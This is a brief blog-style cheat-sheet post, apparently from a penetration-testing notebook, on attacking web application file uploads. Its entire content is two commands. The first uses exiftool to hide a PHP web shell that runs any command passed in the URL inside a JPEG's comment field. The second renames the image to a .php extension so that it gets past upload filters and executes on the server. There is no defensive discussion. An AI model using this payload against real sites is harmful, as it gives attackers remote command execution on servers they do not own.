---
layout: post
title:  "webapp - file upload"
date:   2022-01-01
categories: web
---


## Exiftool php in image

```bash

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' 1.jpg

mv 1.jpg 1.jpg.php

```